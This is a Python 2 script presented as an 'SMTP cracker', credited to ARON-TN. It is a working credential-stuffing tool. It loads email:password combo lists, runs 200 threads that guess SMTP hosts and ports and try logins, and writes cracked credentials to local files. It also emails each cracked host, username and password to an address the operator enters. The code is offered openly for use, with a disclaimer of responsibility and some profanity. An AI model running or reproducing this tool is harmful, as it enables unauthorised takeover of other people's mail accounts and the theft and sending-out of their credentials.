#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Coded By ARON-TN
#Don't Change copyright Mother Fucker :)
#Tunisia Coderz
#Tool Finished In : 01:22 10/03/2019
#Tool Fixed in : 15:33 10/06/2019
import os,socket,threading,base64,datetime,sys,ssl,imaplib,time,re,uuid
try:
  if os.name=='nt':
   os.system('cls')
  else:
   os.system('clear')
except:
    print("\033[91mERROR :| \nConatct ARON-TN AS u LIKE !\033[00m")
msg0 ="\033[91m########## verified Your modules ########"
for i in msg0:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.02)
try: 
 import Queue
except:
  print"\033[91m[\033[92m?\033[91m] Installing Queue Module\033[00m"
  if os.name=='nt':
    try:
      os.system('C:\Python27\Scripts\pip2.exe install Queue')
      import Queue
    except:
      print "Install Python-Pip Sir"
      raw_input('')
  else:
    try:
      os.system('pip2 install Queue')
      import Queue
    except:
      print "\033[91mTry To Install pip2 For Your Devices And Try 'root@usr:~$ pip2 install Queue'\033[00m"
try:
 import requests
except:
  print"\033[91m[\033[92m?\033[91m] Installing requests Module\033[00m"
  if os.name=='nt':
    try:
      os.system('C:\Python27\Scripts\pip2.exe install requests')
    except:
      print "Install Python-Pip Sir"
      raw_input('')
  else:
    os.system('pip2 install requests')
try:
 import colorama
except:
  print"\033[91m[\033[92m?\033[91m] Installing colorama Module\033[00m"
  if os.name=='nt':
    try:
      os.system('C:\Python27\Scripts\pip2.exe install colorama')
    except:
      print "Install Python-Pip Sir"
      raw_input('')
  else:
    os.system('pip2 install colorama')
msg00 ="\n\033[92m##### GOOd Now You have all modules #####\n\033[0;96m############## Let's start ##############\033[92m\n"
for i in msg00:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.02)
def aron():
 try:
  if os.name=='nt':
   os.system('cls && cd Smtp-cracker && smtp.py')
  else:
   os.system('clear && cd Smtp-cracker && python2 smtp.py')
 except:
    print("\033[91mERROR :| \nConatct ARON-TN AS u LIKE !\033[00m")
to_check={}
from colorama import *
init()
print '\033[1m'
class IMAP4_SSL(imaplib.IMAP4_SSL):
    def __init__(self, host='', port=imaplib.IMAP4_SSL_PORT, keyfile=None, 
                 certfile=None, ssl_version=None, ca_certs=None, 
                 ssl_ciphers=None,timeout=40):
       self.ssl_version = ssl_version
       self.ca_certs = ca_certs
       self.ssl_ciphers = ssl_ciphers
       self.timeout=timeout
       imaplib.IMAP4_SSL.__init__(self, host, port, keyfile, certfile)
    def open(self, host='', port=imaplib.IMAP4_SSL_PORT):
       self.host = host
       self.port = port
       self.sock = socket.create_connection((host, port),self.timeout)
       extra_args = {}
       if self.ssl_version:
           extra_args['ssl_version'] = self.ssl_version
       if self.ca_certs:
           extra_args['cert_reqs'] = ssl.CERT_REQUIRED
           extra_args['ca_certs'] = self.ca_certs
       if self.ssl_ciphers:
           extra_args['ciphers'] = self.ssl_ciphers
       self.sslobj = ssl.wrap_socket(self.sock, self.keyfile, self.certfile, 
                                     **extra_args)
       self.file = self.sslobj.makefile('rb')
class checkerr(threading.Thread):
	def __init__(self,host,user,pwd,timeout,interval):
		t=threading.Thread.__init__(self)
		self.host=host
		self.user=user
		self.pwd=pwd
		self.interval=interval
		self.timeout=timeout
		self.connected=False
		self.i=None
		self.work=True
		self.attemp=4
		self.inbox=''
		self.spam=''
	def connect(self):
		try:
			i=IMAP4_SSL(host=self.host,port=993)
			i.login(self.user,self.pwd)
			self.i=i
			self.connected=True
		except Exception,e:
			i.close()
			self.connected=False
	def find(self):
		global to_check
		if self.inbox=='':
			rez,folders=self.i.list()
			for f in folders:
				if '"|" ' in f:
					a=f.split('"|" ')
				elif '"/" ' in f:
					a=f.split('"/" ')
				folder=a[1].replace('"','')
				if self.inbox=="":
					if 'inbox' in folder.lower():
						self.inbox=folder
				elif self.spam=="":
					if 'spam' in folder.lower():
						self.spam=folder
			if self.spam=='':
				for f in folders:
					if '"|" ' in f:
						a=f.split('"|" ')
					elif '"/" ' in f:
						a=f.split('"/" ')
					folder=a[1].replace('"','')
					if self.spam=="":
						if 'trash' in folder:
							self.spam=folder
					else:
						break
		self.i.select(self.inbox)
		found=[]
		for k,t in enumerate(to_check):
			rez=self.i.search(None,'SUBJECT',t[0])
			times=time.time()-t[1]
			if times-2>self.timeout:
				found.append(k)
			if len(rez)>0:
				found.append(k)
		self.i.select(self.spam)
		for k,t in enumerate(to_check):
			rez=self.i.search(None,'SUBJECT',t[0])
			times=time.time()-t[1]
			if times-2>self.timeout:
				found.append(k)
			if len(rez)>0:
				found.append(k)
		new=[]
		for k,v in enumerate(to_check):
			if k not in found:
				new.append(v)
		to_check=new
		print '\033[91m[\033[92m+\033[91m]\033[92mChecking for emails\033[97m '+to_check+'\n'
	def run(self):
		global to_checks
		while self.work:
			if not self.connected:
				if self.attemp<=0:
					return 0
				self.connect()
				self.attemp-=1
			if len(to_check)>0:
				self.find()
			time.sleep(self.interval)
def tld2(dom):
		global tlds
		if "." not in dom:
			return ""
		dom=dom.lower()
		parts=dom.split(".")
		if len(parts)<2 or parts[0]=="" or parts[1]=="":
			return ""
		tmp=parts[-1]
		for i,j in enumerate(parts[::-1][1:5]):
			try:
				tmp=tlds[tmp]
				tmp=j+"."+tmp
			except:
				if i==0:
					return ""
				return tmp
		return tmp		
class consumer(threading.Thread):
	def __init__(self,qu):
		threading.Thread.__init__(self)
		self.q=qu
		self.hosts=["","smtp.","mail.","webmail.","secure.","plus.smtp.","smtp.mail.","smtp.att.","pop3.","securesmtp.","outgoing.","smtp-mail.","plus.smtp.mail.","Smtpauths.","Smtpauth."]
		self.ports=[587,465,25]
		self.timeout=13
	def sendCmd(self,sock,cmd):
		sock.send(cmd+"\r\n")
		return sock.recv(900000)
	def addBad(self,ip):
		global bads,rbads
		if rbads:
			bads.append(ip)
		return -1
	def findHost(self,host):
		print '\033[91m[\033[92m*\033[91m]\033[92mSearching smtp host and port on \033[97m'+host+'\n'
		global cache,bads,rbads
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.setblocking(0)
		s.settimeout(self.timeout)
		try:
			d=cache[host]
			try:
				if self.ports[d[1]]==465:
					s=ssl.wrap_socket(s)
				s.connect((self.hosts[d[0]]+host,self.ports[d[1]]))
				return s
			except Exception,e:
				if rbads:
					bads.append(host)
				return None
		except KeyError:
			pass
		cache[host]=[-1,-1]
		for i,p in enumerate(self.ports):
			for j,h in enumerate(self.hosts):
				print '\033[91m[\033[92m*\033[91m]\033[92mTrying connection on\033[97m '+h+host+':'+str(p)+'\n'
				try:
					s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
					s.setblocking(0)
					s.settimeout(self.timeout)
					if p==465:
						s=ssl.wrap_socket(s)
					s.connect((h+host,p))
					cache[host]=[j,i]
					return s
				except Exception,e:
					continue
		bads.append(host)
		del cache[host]
		return None
	def getPass(self,passw,user,domain):
		passw=str(passw)
		if '%null%' in passw:
			return ""
		elif '%user%' in passw:
			user=user.replace('-','').replace('.','').replace('_','')
			return passw.replace('%user%',user)
		elif '%User%' in user:
			user=user.replace('-','').replace('.','').replace('_','')
			return passw.replace('%User%',user)
		elif '%special%' in user:
			user=user.replace('-','').replace('.','').replace('_','').replace('e','3').replace('i','1').replace('a','@')
			return passw.replace('%special%',user)
		elif '%domain%' in passw:
			return passw.replace('%domain%',domain.replace("-",""))
		if '%part' in passw:
			if '-' in user:
				parts=user.split('-')
			elif '.' in user:
				parts=user.split('.')
			elif '_' in user:
				parts=user.split('_')
			try:
				h=passw.replace('%part','').split('%')[0]
				i=int(h)
				p=passw.replace('%part'+str(i)+'%',parts[i-1])
				return p
			except Exception,e:
				return None
		return passw
	def connect(self,tupple,ssl=False):
		global bads,cracked,cache,email
		host=tupple[0].rstrip()
		host1=host
		user=tupple[1].rstrip()
		if host1 in cracked or host1 in bads:
			return 0
		passw=self.getPass(tupple[2].rstrip(),user.rstrip().split('@')[0],host.rstrip().split('.')[0])
		if passw==None:
			return 0
		try:
			if cache[host][0]==-1:
				return 0
		except KeyError:
			pass
		s=self.findHost(host)
		if s==None:
			return -1
		port=str(self.ports[cache[host][1]])
		if port=="465":
			port+="(SSL)"
		host=self.hosts[cache[host][0]]+host
		print '\033[91m[\033[92m*\033[91m]\033[92mTrying > \033[97m'+host+":"+port+":"+user+":"+passw+'\n'
		try:
			banner=s.recv(1024)
			if banner[0:3]!="220":
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,"EHLO ADMIN")
			rez=self.sendCmd(s,"AUTH LOGIN")
			if rez[0:3]!='334':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,base64.b64encode(user))
			if rez[0:3]!='334':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,base64.b64encode(passw))
			if rez[0:3]!="235" or 'fail' in rez:
				self.sendCmd(s,'QUIT')
				s.close()
				return 0
   			print '\n\033[93m[\033[90m>\033[00m]\033[91m B000M Cracked >\033[97m '+host+':'+port+' '+user+' '+passw+'\n'
			save=open('cracked_smtps.txt','a').write(host+":"+port+","+user+","+passw+"\n")
			save=open('cracked_Mailaccess.txt','a').write(user+":"+passw+"\n")
			cracked.append(host1)
			rez=self.sendCmd(s,"RSET")
			if rez[0:3]!='250':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,"MAIL FROM: <"+user+">")
			if rez[0:3]!='250':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,"RCPT TO: <"+email+">")
			if rez[0:3]!='250':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,'DATA')
			headers='From: <'+user+'> ARON-TN\r\n'
			headers+='To: '+email+'\r\n'
			headers+='Reply-To: '+email+'\r\n'
			headers+='Subject: SMTP Cracker User-ID Num: ['+randomString+']\r\n'
			headers+='MIME-Version: 1.0\r\n'
			headers+='Content-Transfer-encoding: 8bit\r\n'
			headers+="Content-type: text/html; charset=utf-8\r\n";
			headers+='Return-Path: %s\r\n'%user
			headers+='X-Priority: 1\r\n'
			headers+='X-MSmail-Priority: High\r\n'
			headers+='X-Mailer: Microsoft Office Outlook, Build 11.0.5510\r\n'
			headers+='X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441\r\n'
			headers+='''<!DOCTYPE html>
<html>
<head>
</head>
<body>
	<center>
		<br><br><br>
		<h1>[ > ]New Smtp Cracker V2.1 [ < ]</h1> <br>
		<font color="#f16f6f"><h1>[ ! ]Developped by ARON-TN [ ! ]</h1></font><br><br><br>
		<font size="6" color="red">/!\ WARNING /!\ <br><font color="red" size="6" ><"/">i don't accept any responsibility for any illegal usage !</font><"/"></font><br><br>
		<font color="black" size="5" ><font color="red">Host :</font> '''+host+''' </font><br><br>
		<font color="black" size="5" ><font color="red">Port :</font> '''+port+'''<br><br></font>
		<font color="black" size="5" ><font color="red">Email :</font> '''+user+'''<br><br></font>
		<font color="black" size="5" ><font color="red">Password :</font> '''+passw+'''<br><br></font>
		<center><img src="http://lh6.googleusercontent.com/-AXuIH_cHGOQ/UUzEKLtQ0EI/AAAAAAAAAGI/jw2FhilfMo4/s298-no/TrollFaceDancing_large.gif"/>
		</center><br><br><br>
		<font color="black" size="5" ><font color="red">Email :</font> aron.tn.official@gmail.com <br><br></font>
		<font color="black" size="5" ><font color="red">Youtube :</font> <a href="https://www.youtube.com/channel/UCuk4DSWDGxdZnHbrqVz0ZZA">Click HEre</a><br><br></font>
		<h2>© ARON-TN 2017-2019</h2>
	</body>
	</html>\r\n.\r\n'''
			s.send(headers)
			rez=s.recv(1000)
			
			self.sendCmd(s,'QUIT')
			s.close()
		except Exception,e:
			s.close()
			return self.addBad(host1)
	def run(self):
		while True:
			cmb=self.q.get()
			self.connect(cmb)
			self.q.task_done()
randomString = uuid.uuid4().hex
randomString = randomString.upper()[0:7]
quee=Queue.Queue(maxsize=20000)
try:
 os.remove('about.txt')
except:
 pass
save=open('about.txt','a').write('Hello \n Welcome Again Smtp Cracker Available & Fixed :) \n [+] Developped By ARON-TN \n Thanks To : #Mr.Zack ** #Alpicino \n [*] Youtube > youtube.com/AronTNxOfficial')
tld=open('about.txt','r').read().splitlines()
tlds=cache={}
bads=[]
cracked=[]
rbads=0
vers=requests.get('https://pastebin.com/raw/WuWLQk73').text.encode('utf-8')
print('''
   \033[0;96m_     _       \033[93m______   __       __  ________  _______      \033[0;96m_     _  
  (c).-.(c)     \033[93m/      \ /  \     /  |/        |/       \    \033[0;96m(c).-.(c)
   / ._. \     \033[93m/$$$$$$  |$$  \   /$$ |$$$$$$$$/ $$$$$$$  |    \033[0;96m/ ._. \ 
 __\( Y )/__   \033[93m$$ \__$$/ $$$  \ /$$$ |   $$ |   $$ |__$$ |  \033[0;96m__\( Y )/__ 
(_.-/'-'\-._)  \033[93m$$      \ $$$$  /$$$$ |   $$ |   $$    $$/  \033[0;96m(_.-/'-'\-._)
   || A ||      \033[93m$$$$$$  |$$ $$ $$/$$ |   $$ |   $$$$$$$/      \033[0;96m|| R ||
 _.' `-' '._   \033[93m/  \__$$ |$$ |$$$/ $$ |   $$ |   $$ |        \033[0;96m_.' `-' '._  
(.-./`-'\.-.)  \033[93m$$    $$/ $$ | $/  $$ |   $$ |   $$ |       \033[0;96m(.-./`-'\.-.) 
 `-'     `-'    \033[93m$$$$$$/  $$/      $$/    $$/    $$/         \033[0;96m`-'     `-'
               \033[91m[\033[92m+\033[91m]\033[1m(C)opyright > Github.com/ARON-TN\033[91m [\033[92m+\033[91m]
              \033[91m[\033[92m+\033[91m]\033[95m SMTP CRACKER V2.1 DEVEL BY ARON-TN \033[91m[\033[92m+\033[91m]
             \033[91m[\033[92m+\033[91m]\033[92m   Mail : aron.tn.official@gmail.com  \033[91m[\033[92m+\033[91m]
            \033[91m[\033[92m+\033[91m]\033[94m Facebook >  https://fb.com/amyr.gov.tn \033[91m[\033[92m+\033[91m]
           \033[91m[\033[92m+\033[91m]   Youtube > youtube.com/AronTNxOfficial  \033[91m[\033[92m+\033[91m]''')
ms0g ="\n\033[93mChecking\033[0;96m Your\033[91m Version (%s)\033[92m "%vers
for i in ms0g:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.02)
if vers=='2.1':
  print('{>} Good You have last version \n')
else:
 print("\033[91mThere is New Version available !! Do you Want To Update Your tool ? \033[00m")
 ok=raw_input('''
   \033[91m[\033[94m1\033[91m]\033[00m YEs
   \033[91m[\033[94m2\033[91m]\033[00m No
  \033[91m[\033[94m>\033[91m]\033[00m : ''')
 if ok=='1':
  aroon ="\n Update Strated !\n"
  for i in aroon:
   sys.stdout.write(i)
   sys.stdout.flush()
   time.sleep(0.02)
  os.remove(sys.argv[0])
  os.system('git clone https://github.com/aron-tn/Smtp-cracker && cd Smtp-cracker')
  if os.name=='nt':
   os.system('cls')
  else:
   os.system('clear')
  os.system('smtp.py')
 elif ok=='2':
  pass
try:
  inputs=open(raw_input('\033[91m[\033[92m+\033[91m]\033[92m Combo Name : \033[97m'),'r').read().splitlines()
except:
	sys.exit("\n\033[91m{!} Your File not Founded\033[00m")
email=raw_input('\033[91m[\033[92m+\033[91m]\033[92m Enter Your Email :\033[97m ')
thret=200
def part():
	global tld,tlds
	for i in tld:
		tlds[i]=i
part()
msg ="\n\033[91mConnecting ..........."
for i in msg:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.2)
for i in range(int(thret)):
    try:
        t=consumer(quee)
        t.setDaemon(True)
        t.start()
    except:
		print "\033[91m{!} Working only with %s threads\033[00m"%i
		break
try:
    for i in inputs:
        user = i.split(':')[0]
        password = i.split(':')[1]
        user = user.lower()
        quee.put((user.split('@')[1], user, password))
except:
	pass
quee.join()
